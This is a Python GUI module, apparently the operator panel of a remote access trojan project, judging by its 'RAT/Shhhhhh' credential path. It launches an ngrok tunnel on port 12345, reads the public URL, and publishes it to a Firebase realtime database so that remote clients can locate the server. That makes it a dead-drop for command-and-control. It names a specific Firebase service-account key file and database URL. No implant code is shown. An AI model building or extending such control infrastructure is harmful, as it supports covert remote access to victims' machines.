import customtkinter as ctk
import webbrowser
import firebase_admin
from firebase_admin import credentials, db
import subprocess
import threading
import time
import requests

firebase_initialized = False  # Флаг, чтобы инициализировать Firebase один раз

def clear_frame(frame):
    for widget in frame.winfo_children():
        widget.destroy()

def server(parent_frame, go_back_callback=None):
    clear_frame(parent_frame)

    global firebase_initialized

    main_frame = ctk.CTkFrame(parent_frame)
    main_frame.pack(expand=True, fill="both", padx=20, pady=20)

    left_frame = ctk.CTkFrame(main_frame)
    left_frame.pack(side="left", fill="both", padx=10, pady=10)

    right_frame = ctk.CTkFrame(main_frame)
    right_frame.pack(side="right", expand=True, fill="both", padx=10, pady=10)

    info_label = ctk.CTkLabel(
        left_frame,
        text="Will open the browser, you need to start the server on port 12345",
        font=ctk.CTkFont(size=14),
        wraplength=250
    )
    info_label.pack(pady=(10, 20))

    login_and_open_btn = ctk.CTkButton(left_frame, text="Войти", command=lambda: open_browser())
    login_and_open_btn.pack(pady=10)

    start_ngrok_server = ctk.CTkButton(left_frame, text="Start ngrok server", command=lambda: start_ngrok())
    start_ngrok_server.pack(pady=10)
    # Label для отображения полученной ngrok-ссылки
    ngrok_url_label = ctk.CTkLabel(right_frame, text="", text_color="green", cursor="hand2")
    ngrok_url_label.pack(pady=5)

    # Кнопка для вставки ссылки в поле
    def insert_ngrok_url():
        ngrok_url_entry.delete(0, "end")
        ngrok_url_entry.insert(0, ngrok_url_label.cget("text"))

    def update_ngrok_url(public_url):
        ngrok_url_label.configure(text=public_url)
        ngrok_url_entry.delete(0, "end")
        ngrok_url_entry.insert(0, public_url)


    insert_button = ctk.CTkButton(right_frame, text="Вставить", command=lambda: insert_ngrok_url())
    insert_button.pack(pady=5)

    port_frame = ctk.CTkFrame(right_frame)
    port_frame.pack(pady=5, fill="x")

    port_entry = ctk.CTkEntry(port_frame, placeholder_text="Enter port")
    port_entry.pack(side="left", expand=True, fill="x")

    def insert_ngrok_url_to_port():
        # Берём текст из ngrok_url_label
        text = ngrok_url_label.cget("text")
        # Вставляем в port_entry
        port_entry.delete(0, "end")
        port_entry.insert(0, text)

    insert_port_btn = ctk.CTkButton(port_frame, text="Вставить URL", width=80, command=insert_ngrok_url_to_port)
    insert_port_btn.pack(side="left", padx=(5,0))

    ngrok_url_entry = ctk.CTkEntry(right_frame, placeholder_text="Enter ngrok url")
    ngrok_url_entry.pack(pady=5)

    save_data_btn = ctk.CTkButton(right_frame, text="Save data", command=lambda: save_data_to_firebase())
    save_data_btn.pack(pady=10)

    if go_back_callback:
        back_btn = ctk.CTkButton(left_frame, text="Назад", command=go_back_callback)
        back_btn.pack(side="bottom", pady=10)

    def save_data_to_firebase():
        global firebase_initialized  # используем глобальную переменную

        if not firebase_initialized:
            cred = credentials.Certificate('RAT/Shhhhhh/ngrokservers-2e669-firebase-adminsdk-fbsvc-a3b5c0e48c.json')
            firebase_admin.initialize_app(cred, {
                'databaseURL': 'https://ngrokservers-2e669-default-rtdb.europe-west1.firebasedatabase.app/'
            })
            firebase_initialized = True

        server_data = {
            'status': 'online',
            'https_url': ngrok_url_entry.get(),
            'ngrok_port': port_entry.get(),
            'ngrok_url': "btd2u35hv.localto.net"
        }

        ref = db.reference('serverInfo')
        ref.set(server_data)

    def start_ngrok():
        def run_ngrok():
            # Запускаем ngrok в фоне (убедись, что ngrok в PATH)
            subprocess.Popen(["ngrok", "http", "12345"])

            # Ждём запуска ngrok и появления API
            time.sleep(3)

            try:
                response = requests.get("http://127.0.0.1:4040/api/tunnels")
                tunnels = response.json().get("tunnels", [])

                for tunnel in tunnels:
                    if tunnel.get("proto") == "https":
                        public_url = tunnel.get("public_url")

                        # Обновляем GUI через .after (потому что мы в потоке)
                        parent_frame.after(0, lambda: update_ngrok_url(public_url))
                        break
            except Exception as e:
                print("Ошибка при получении ngrok URL:", e)

        threading.Thread(target=run_ngrok, daemon=True).start()


    def open_browser():
        url = 'https://localtonet.com/tunnel/tcpudp'
        webbrowser.open(url)